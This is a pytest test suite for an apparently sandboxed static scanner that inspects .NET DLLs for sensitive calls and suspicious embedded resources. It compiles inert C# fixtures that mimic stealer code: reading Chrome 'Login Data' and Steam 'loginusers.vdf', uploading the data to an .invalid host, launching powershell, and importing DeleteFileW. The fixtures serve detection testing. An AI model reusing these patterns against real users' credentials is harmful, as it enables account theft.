"""Protocol 2 scans inert IL; declarations are not reported as runtime behavior."""
import json
import hashlib
import os
import shutil
import sys
from pathlib import Path
import struct
import subprocess

import pytest

from tests.metadata.test_static_parser import BUILD, ROOT
from backend.scanning.worker_client import decode_security_response
from backend.scanning import worker_client as client


@pytest.fixture(scope='module')
def security_artifacts(tmp_path_factory):
    root = tmp_path_factory.mktemp('security-parser')
    helper = BUILD.compile_source(ROOT / 'tools/PSModManager.Metadata/Program.cs', root / 'helper/PSModManager.Metadata.dll')
    marker = root / 'must-not-execute.txt'
    source = root / 'SecurityFixture.cs'
    source.write_text('''using System; using System.IO; using System.Net.Http;
using System.Reflection; using System.Runtime.InteropServices; using System.Diagnostics;
public class SecurityFixture {
 static SecurityFixture(){ File.WriteAllText(@"MARKER", "BAD"); }
 [DllImport("kernel32.dll", EntryPoint="GetCurrentProcessId")] static extern uint Native();
 [DllImport("kernel32.dll", EntryPoint="DeleteFileW")] static extern bool Uncalled(string path);
 public void NeverExecuted() {
  string text=File.ReadAllText("Chrome/User Data/Default/Login Data");
  File.WriteAllText("C:/owned-fixture/output.txt", text);
  Process.Start("not-a-real-process", "powershell -NoProfile");
  new HttpClient().GetStringAsync("https://static-fixture.invalid/path");
  Assembly.Load(Array.Empty<byte>()); Native();
 }
}'''.replace('MARKER', str(marker)), encoding='utf-8')
    png = root / 'sprite.bin'; png.write_bytes(b'\x89PNG\r\n\x1a\nfixture')
    embedded = root / 'inert-pe.bin'; embedded.write_bytes(b'MZ-inert-header-not-executable')
    archive = root / 'inert-archive.bin'; archive.write_bytes(b'PK\x03\x04not-a-real-archive')
    dll = BUILD.compile_source(source, root / 'SecurityFixture.dll', library=True,
        resources=[(png, f'sprite.{i}.png') for i in range(848)] +
                  [(embedded, 'late-payload.bin'), (archive, 'late-archive.bin')])
    return root, helper, dll, marker, len(png.read_bytes()) * 848 + len(embedded.read_bytes()) + len(archive.read_bytes())


def invoke(artifacts, path=None, raw=None, args=('--security',)):
    request = raw if raw is not None else json.dumps({'protocol_version': 2, 'input_path': str(path or artifacts[2])}).encode()
    result = subprocess.run([BUILD.toolchain()[0], str(artifacts[1]), *args], input=request, capture_output=True, timeout=8)
    assert result.stderr == b'' and len(result.stdout) <= 256 * 1024
    return result.returncode, json.loads(result.stdout)


def process_response(value, exit_code=0):
    return dict(started=True, appcontainer=True, capabilities=0, lpac_policy_applied=True, status='exited',
        cleanup_remaining=0, profile_deleted=True, desktop_closed=True, exit_code=exit_code, stdout=json.dumps(value, separators=(',', ':')))


def test_sensitive_il_calls_have_method_offset_and_distinct_declarations(security_artifacts):
    code, value = invoke(security_artifacts)
    assert code == 0 and value['protocol_version'] == 2 and value['status'] == 'managed'
    security = value['report']['security']
    assert security['coverage']['status'] == 'complete'
    assert {'file_read', 'file_write', 'network', 'dynamic_load', 'process_start', 'native_interop'} <= {r['category'] for r in security['calls']}
    assert all(isinstance(row['offset'], int) and row['method_token'].startswith('0x06') and row['opcode'] in ('call', 'callvirt', 'newobj', 'jmp', 'calli') for row in security['calls'])
    assert {row['entry_point'] for row in security['pinvokes']} == {'GetCurrentProcessId', 'DeleteFileW'}
    assert any(row['target'].endswith('::Native') for row in security['calls'])
    assert not any(row['target'].endswith('::Uncalled') for row in security['calls'])
    assert any(row['kind'] == 'url' and row['value'].endswith('.invalid/path') for row in security['strings'])
    assert any(row['kind'] == 'sensitive_path' for row in security['strings'])
    assert not security_artifacts[3].exists()
    assert decode_security_response(process_response(value)) == value


def test_resource_aggregation_checks_late_embedded_pe_and_archive(security_artifacts):
    _, value = invoke(security_artifacts)
    security = value['report']['security']
    assert security['counts']['resources_total'] == security['counts']['resources_scanned'] == 850
    assert security['sizes']['embedded_resource_payload_bytes'] == security_artifacts[4]
    assert security['counts']['suspicious_resources_total'] == 2
    assert {r['header_kind'] for r in security['resources']} >= {'pe', 'zip', 'png'}
    assert len(security['resources']) == 64 and security['coverage']['evidence_limited']
    assert security['coverage']['omitted_evidence_counts']['resources'] == 786
    assert security['coverage']['status'] == 'complete'  # Sampling != unfinished traversal.


def test_legacy_mode_still_rejects_v2_and_v2_rejects_v1(security_artifacts):
    assert invoke(security_artifacts, args=())[1]['status'] == 'invalid_request'
    request = json.dumps(dict(protocol_version=1, input_path=str(security_artifacts[2]))).encode()
    assert invoke(security_artifacts, raw=request)[1]['status'] == 'invalid_request'


def test_v2_isolation_requirement_fails_before_candidate_open(security_artifacts):
    code, value = invoke(security_artifacts, path=security_artifacts[0] / 'missing.dll', args=('--require-isolation', '--security'))
    assert code == 2 and value == dict(protocol_version=2, status='sandbox_unavailable', report=None, error='network_boundary_unproven')


def test_native_reports_explicit_unanalyzed_code_coverage(security_artifacts):
    data = bytearray(security_artifacts[2].read_bytes()); pe = struct.unpack_from('<I', data, 0x3c)[0]
    struct.pack_into('<II', data, pe + 24 + 96 + 14 * 8, 0, 0)
    path = security_artifacts[0] / 'native-inert.dll'; path.write_bytes(data)
    code, value = invoke(security_artifacts, path)
    assert code == 0 and value['status'] == 'native'
    assert value['report']['security']['coverage']['reasons'] == ['native_code_not_analyzed']
    assert decode_security_response(process_response(value)) == value


def test_bad_resource_bounds_are_partial_not_a_clean_report(security_artifacts):
    data = bytearray(security_artifacts[2].read_bytes()); at = data.index(b'MZ-inert-header-not-executable')
    struct.pack_into('<i', data, at - 4, 0x7fffffff)
    path = security_artifacts[0] / 'bad-resource.dll'; path.write_bytes(data)
    code, value = invoke(security_artifacts, path)
    assert code == 0
    security = value['report']['security']
    assert security['coverage']['status'] == 'partial' and 'invalid_resource_bounds' in security['coverage']['reasons']
    assert security['counts']['resources_scanned'] == 849
    assert decode_security_response(process_response(value)) == value


@pytest.mark.parametrize('tamper', ['complete_partial', 'negative_size', 'wrong_total', 'unknown_field', 'too_many_calls', 'missing_scan', 'missing_limitations'])
def test_host_rejects_inconsistent_security_evidence(security_artifacts, tamper):
    _, value = invoke(security_artifacts); security = value['report']['security']
    if tamper == 'complete_partial': security['coverage']['reasons'] = ['invalid_method_il']
    if tamper == 'negative_size': security['sizes']['file_bytes'] = -1
    if tamper == 'wrong_total': security['counts']['sensitive_calls_total'] += 1
    if tamper == 'unknown_field': security['calls'][0]['executed'] = True
    if tamper == 'too_many_calls': security['calls'] *= 100
    if tamper == 'missing_scan': security['counts']['methods_total'] += 1
    if tamper == 'missing_limitations': security['coverage']['limitations'] = []
    with pytest.raises(ValueError, match='WORKER_PROTOCOL_INVALID'):
        decode_security_response(process_response(value))


def test_host_rejects_duplicate_json_fields(security_artifacts):
    _, value = invoke(security_artifacts)
    process = process_response(value)
    process['stdout'] = process['stdout'].replace('"schema_version":2', '"schema_version":1,"schema_version":2')
    with pytest.raises(ValueError, match='WORKER_PROTOCOL_INVALID'):
        decode_security_response(process)


def test_output_sampling_preserves_totals_and_bound(security_artifacts):
    root = security_artifacts[0]
    source = root / 'Verbose.cs'
    methods = ['public void ' + '测' * 200 + str(i) + '(){System.IO.File.ReadAllText("https://fixture.invalid/' + '例' * 300 + '");}' for i in range(180)]
    source.write_text('public class Verbose {' + ''.join(methods) + '}', encoding='utf-8')
    dll = BUILD.compile_source(source, root / 'Verbose.dll', library=True)
    _, value = invoke(security_artifacts, dll)
    security = value['report']['security']
    assert security['counts']['sensitive_calls_total'] == 180
    assert security['counts']['interesting_strings_total'] == 180
    assert security['category_counts'] == {'file_read': 180}
    assert security['coverage']['status'] == 'complete' and security['coverage']['evidence_limited']
    # Escaped UTF-16 names force the byte cap in addition to list limits.
    assert len(security['calls']) < 128 or len(security['strings']) < 64
    assert decode_security_response(process_response(value)) == value


@pytest.mark.skipif(os.name != 'nt', reason='Windows AppContainer boundary')
def test_security_worker_real_lpac_never_runs_fixture(security_artifacts, tmp_path):
    source = tmp_path / 'package'; source.mkdir()
    shutil.copyfile(security_artifacts[2], source / 'Fixture.dll')
    worker = client.MetadataWorker(tmp_path / 'data', helper=security_artifacts[1].parent)
    result = worker.inspect_security(source, 'Fixture.dll')
    assert result['status'] == 'managed', result
    assert result['sha256'] == hashlib.sha256((source / 'Fixture.dll').read_bytes()).hexdigest()
    process = result['process']
    assert process['appcontainer'] and process['capabilities'] == 0 and process['lpac_policy_applied']
    assert process['cleanup_remaining'] == 0 and process['profile_deleted'] and process['desktop_closed']
    assert result['metadata']['security']['counts']['resources_scanned'] == 850
    assert not security_artifacts[3].exists()
    assert not list((tmp_path / 'data/metadata/staging').iterdir())


def test_security_worker_hash_only_without_sandbox(security_artifacts, tmp_path, monkeypatch):
    monkeypatch.setattr(client, 'run_sandbox', lambda *a, **k: dict(started=False, appcontainer=False, capabilities=None))
    result = client.MetadataWorker(tmp_path / 'data', helper=security_artifacts[1].parent).inspect_security(
        security_artifacts[0], 'SecurityFixture.dll')
    assert result['status'] == 'hash_only' and result['error'] == 'SANDBOX_UNAVAILABLE' and result['sha256']
    assert result['metadata'] is None
    assert not list((tmp_path / 'data/metadata/staging').iterdir())


def test_security_worker_cancel_prevents_launch(security_artifacts, tmp_path, monkeypatch):
    def forbidden(*a, **k): raise AssertionError('worker must not launch')
    monkeypatch.setattr(client, 'run_sandbox', forbidden)
    result = client.MetadataWorker(tmp_path / 'data', helper=security_artifacts[1].parent).inspect_security(
        security_artifacts[0], 'SecurityFixture.dll', cancelled=lambda: True)
    assert result['status'] == 'cancelled' and result['metadata'] is None


@pytest.mark.skipif(os.name != 'nt', reason='Windows AppContainer boundary')
def test_security_worker_changed_source_discards_parsed_result(security_artifacts, tmp_path, monkeypatch):
    source = tmp_path / 'package'; source.mkdir(); shutil.copyfile(security_artifacts[2], source / 'Fixture.dll')
    original = client.run_sandbox
    def changed(*args, **kwargs):
        result = original(*args, **kwargs)
        with (source / 'Fixture.dll').open('ab') as stream: stream.write(b'changed after staging')
        return result
    monkeypatch.setattr(client, 'run_sandbox', changed)
    result = client.MetadataWorker(tmp_path / 'data', helper=security_artifacts[1].parent).inspect_security(source, 'Fixture.dll')
    assert result['status'] == 'changed' and result['error'] == 'INPUT_CHANGED' and result['metadata'] is None
    assert not list((tmp_path / 'data/metadata/staging').iterdir())


@pytest.mark.skipif(os.name != 'nt', reason='Windows GUI host boundary')
def test_pythonw_security_worker_uses_console_host_and_lpac(security_artifacts, tmp_path):
    script = tmp_path / 'gui_security_probe.py'
    output = tmp_path / 'gui-result.json'
    script.write_text('''import ctypes, json, sys
from pathlib import Path
sys.path.insert(0, sys.argv[1])
from backend.scanning.worker_client import MetadataWorker
result=MetadataWorker(sys.argv[4], helper=sys.argv[3]).inspect_security(sys.argv[2], "SecurityFixture.dll")
Path(sys.argv[5]).write_text(json.dumps({"console_window":ctypes.windll.kernel32.GetConsoleWindow(),"result":result}),encoding="utf-8")
''', encoding='utf-8')
    process = subprocess.run([str(Path(sys.executable).with_name('pythonw.exe')), '-I', '-B', str(script),
        str(ROOT), str(security_artifacts[0]), str(security_artifacts[1].parent), str(tmp_path / 'data'), str(output)],
        timeout=30, creationflags=subprocess.DETACHED_PROCESS)
    report = json.loads(output.read_text(encoding='utf-8'))
    assert process.returncode == 0 and report['console_window'] == 0, report
    result = report['result']; assert result['status'] == 'managed', result
    child = result['process']
    assert child['console_host']['started'] and child['console_host']['cleanup_remaining'] == 0
    assert child['appcontainer'] and child['capabilities'] == 0 and child['lpac_policy_applied']
    assert child['profile_deleted'] and child['desktop_closed'] and child['cleanup_remaining'] == 0
    assert not security_artifacts[3].exists()


@pytest.fixture(scope='module')
def identity_artifacts(security_artifacts):
    root = security_artifacts[0]
    real = root / 'RealFramework.cs'
    real.write_text('''using System.IO; using System.Net;
public class S { public void M(){var b=File.ReadAllBytes("loginusers.vdf");new WebClient().UploadData("https://inert.invalid", b);} }
''', encoding='utf-8')
    real_dll = BUILD.compile_source(real, root / 'RealFramework.dll', library=True)
    local = root / 'LocalImpostor.cs'
    definitions = '''namespace System.IO {public class File {public static byte[] ReadAllBytes(string p){return System.Array.Empty<byte>();}}}
namespace System.Net {public class WebClient {public byte[] UploadData(string u,byte[] b){return b;}}}
'''
    local.write_text(definitions + real.read_text(encoding='utf-8').replace('using System.IO; using System.Net;', '')
        .replace('File.ReadAllBytes', 'System.IO.File.ReadAllBytes').replace('new WebClient()', 'new System.Net.WebClient()'), encoding='utf-8')
    local_dll = BUILD.compile_source(local, root / 'LocalImpostor.dll', library=True)
    fake = root / 'ExternalImpostor.cs'; fake.write_text(definitions, encoding='utf-8')
    fake_dll = BUILD.compile_source(fake, root / 'fake/System.Net.WebClient.dll', library=True)
    external = root / 'ExternalCaller.cs'
    external.write_text('''extern alias Own;
public class S { public void M(){var b=Own::System.IO.File.ReadAllBytes("loginusers.vdf");new Own::System.Net.WebClient().UploadData("https://inert.invalid", b);} }
''', encoding='utf-8')
    external_dll = BUILD.compile_source(external, root / 'ExternalCaller.dll', library=True, additional_references=['Own=' + str(fake_dll)])
    return real_dll, local_dll, external_dll


@pytest.mark.skipif(os.name != 'nt', reason='Windows AppContainer boundary')
@pytest.mark.parametrize('sample', ['framework', 'local_impostor', 'external_unsigned_impostor'])
def test_lpac_call_identity_and_steam_credential_literal(security_artifacts, identity_artifacts, tmp_path, sample):
    dll = identity_artifacts[['framework', 'local_impostor', 'external_unsigned_impostor'].index(sample)]
    result = client.MetadataWorker(tmp_path / 'data', helper=security_artifacts[1].parent).inspect_security(dll.parent, dll.name)
    assert result['status'] == 'managed', result
    sec = result['metadata']['security']
    assert sec['schema_version'] == 2 and sec['analyzer'] == 'psmm-static-security-v2'
    assert sec['coverage']['status'] == 'complete', sec['coverage']
    assert any(s['kind'] == 'sensitive_path' and s['value'] == 'loginusers.vdf' for s in sec['strings'])
    calls = [c for c in sec['calls'] if c['target'].endswith(('::ReadAllBytes', '::UploadData'))]
    assert len(calls) == 2
    if sample == 'local_impostor':
        assert all(c['target_kind'] == 'method_definition' and c['declaring_scope']['kind'] == 'local' and c['declaring_scope']['assembly'] is None for c in calls)
    else:
        assert all(c['target_kind'] == 'member_reference' and c['declaring_scope']['kind'] == 'assembly_reference' and c['declaring_scope']['token'].startswith('0x23') for c in calls)
        identities = [c['declaring_scope']['assembly'] for c in calls]
        if sample == 'framework':
            assert {a['name'] for a in identities} == {'System.Runtime', 'System.Net.WebClient'}
            assert {a['public_key_token'] for a in identities} == {'b03f5f7f11d50a3a', 'cc7b13ffcd2ddd51'}
        else:
            assert all(a['name'] == 'System.Net.WebClient' and a['public_key_token'] is None for a in identities)
    process = result['process']
    assert process['appcontainer'] and process['capabilities'] == 0 and process['lpac_policy_applied']
    assert process['profile_deleted'] and process['cleanup_remaining'] == 0


@pytest.mark.parametrize('tamper', ['old_analyzer', 'local_with_assembly', 'assembly_wrong_token', 'invalid_public_token', 'wrong_target_kind'])
def test_host_rejects_inconsistent_declaring_scope(security_artifacts, tamper):
    _, value = invoke(security_artifacts)
    sec = value['report']['security']
    call = next(c for c in sec['calls'] if c['declaring_scope']['kind'] == 'assembly_reference')
    if tamper == 'old_analyzer': sec.update(schema_version=1, analyzer='psmm-static-security-v1')
    if tamper == 'local_with_assembly': call['declaring_scope']['kind'] = 'local'
    if tamper == 'assembly_wrong_token': call['declaring_scope']['token'] = '0x02000001'
    if tamper == 'invalid_public_token': call['declaring_scope']['assembly']['public_key_token'] = 'trusted-by-name'
    if tamper == 'wrong_target_kind': call['target_kind'] = 'method_definition'
    with pytest.raises(ValueError, match='WORKER_PROTOCOL_INVALID'):
        decode_security_response(process_response(value))
